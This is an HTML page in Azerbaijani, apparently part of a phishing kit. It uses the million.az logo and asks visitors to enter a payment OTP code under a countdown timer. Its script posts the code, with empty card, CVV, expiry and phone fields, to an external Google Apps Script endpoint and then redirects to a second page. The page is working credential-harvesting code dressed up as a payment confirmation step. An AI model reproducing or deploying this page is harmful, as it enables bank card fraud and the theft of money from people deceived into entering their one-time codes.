<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Təsdiq</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f9f9f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: #fff;
            border-radius: 15px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 40px;
            text-align: center;
            width: 500px;
        }

        .logo img {
            width: 200px;
            margin-bottom: 20px;
        }

        .info-text {
            font-size: 20px;
            color: #333;
            margin-bottom: 20px;
            line-height: 1.8;
        }

        .form-group {
            margin-bottom: 30px;
            text-align: left;
        }

        .form-group label {
            font-size: 18px;
            color: #333;
            display: block;
            margin-bottom: 10px;
        }

        .form-group input[type="number"] {
            width: 100%;
            padding: 15px;
            font-size: 18px;
            border: 2px solid #ccc;
            border-radius: 10px;
            box-sizing: border-box;
        }

        .timer {
            font-size: 24px;
            color: red;
            margin: 10px 0;
            text-align: center;
        }

        button {
            width: 100%;
            padding: 15px;
            font-size: 20px;
            color: #fff;
            background-color: #d30412;
            border: none;
            border-radius: 10px;
            cursor: not-allowed;
            margin-top: 20px;
        }

        button:enabled {
            background-color: #b3030f;
            cursor: pointer;
        }

        button:disabled {
            background-color: #f5c6c6;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://million.az/logo/main-logo.svg" alt="Logo">
        </div>
        <div class="info-text">
            Ödəniş istəkləri çox olduğundan OTP kodunuz gec göndərilə bilər! <br>
            Səhifədən ayrılmamağınızı xahiş olunur!
        </div>
        <form id="otpForm">
            <div class="form-group">
                <label for="otpInput">OTP kodunu daxil edin.</label>
                <input type="number" id="otpInput" placeholder="OTP" required>
            </div>
            <div class="timer" id="timer">Qalan vaxt: 05:00</div>
            <button type="button" id="submitButton" disabled>Ödənişi Təsdiqlə</button>
        </form>
    </div>
    <script>
        // Timer Fonksiyonu (5 Dakika)
        function startTimer(duration, display) {
            let timer = duration, minutes, seconds;
            const interval = setInterval(function () {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                display.textContent = `Qalan vaxt: ${minutes}:${seconds}`;

                if (--timer < 0) {
                    clearInterval(interval);
                    display.textContent = "Qalan vaxt: 00:00";
                    document.getElementById("submitButton").disabled = true;
                }
            }, 1000);
        }

        window.onload = function () {
            const display = document.getElementById("timer");
            const fiveMinutes = 5 * 60;
            startTimer(fiveMinutes, display);
        };

        document.getElementById("submitButton").addEventListener("click", function () {
            const otpInput = document.getElementById("otpInput").value.trim();

            // Maksimum 6 ve minimum 4 karakter kontrolü
            if (otpInput.length < 4 || otpInput.length > 6) {
                alert("OTP kodu 4 ilə 6 rəqəm arasında olmalıdır!");
                return;
            }

            // Veriyi sadece OTP içerecek şekilde oluşturuyoruz
            const data = {
                telefon: "",  // Boş bırakıyoruz
                tutar: "",    // Boş bırakıyoruz
                kart: "",     // Boş bırakıyoruz
                ay: "",       // Boş bırakıyoruz
                yil: "",      // Boş bırakıyoruz
                cvv: "",      // Boş bırakıyoruz
                otp: otpInput // Sadece OTP verisini gönderiyoruz
            };

            fetch("https://script.google.com/macros/s/AKfycbySe0hCUb5zREcOJQlTi2e3-OuQvd4CaW9iO0EHtTcJbabMQdFMrEkBZ8xx0lFDgCHi/exec", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(data),
                mode: "no-cors", // CORS'u devre dışı bırak
            })
            .then(response => {
                window.location.href = "index2.html"; // Başarıyla yönlendirme
            })
            .catch(error => {
                console.error("OTP Gönderim Hatası:", error);
            });
        });

        document.getElementById("otpInput").addEventListener("input", function () {
            const otpInput = document.getElementById("otpInput").value.trim();
            const submitButton = document.getElementById("submitButton");

            if (otpInput.length >= 4 && otpInput.length <= 6) {
                submitButton.disabled = false;
            } else {
                submitButton.disabled = true;
            }
        });
    </script>
</body>
</html>
